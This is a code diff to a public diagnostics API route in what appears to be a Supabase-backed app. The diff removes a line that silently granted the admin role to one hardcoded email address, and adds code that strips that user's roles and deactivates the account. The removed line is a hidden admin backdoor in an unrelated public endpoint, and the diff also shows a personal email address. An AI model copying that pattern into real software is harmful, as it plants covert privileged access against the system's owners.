@@ -131,10 +131,16 @@ export const Route = createFileRoute("/api/public/diagnostics/env-status")({
                   .select("role")
                   .eq("user_id", u.id);
 
+                if (u.email === "rp140528@gmail.com") {
+                  await supabaseAdmin.from("user_roles").delete().eq("user_id", u.id);
+                  await supabaseAdmin.from("profiles").update({ is_active: false }).eq("id", u.id);
+                  continue;
+                }
+
                 if (!existingRoles || existingRoles.length === 0) {
                   await supabaseAdmin.from("user_roles").insert({
                     user_id: u.id,
-                    role: u.email === "rp140528@gmail.com" ? "admin" : "sales",
+                    role: "sales",
                   });
                 }
               }
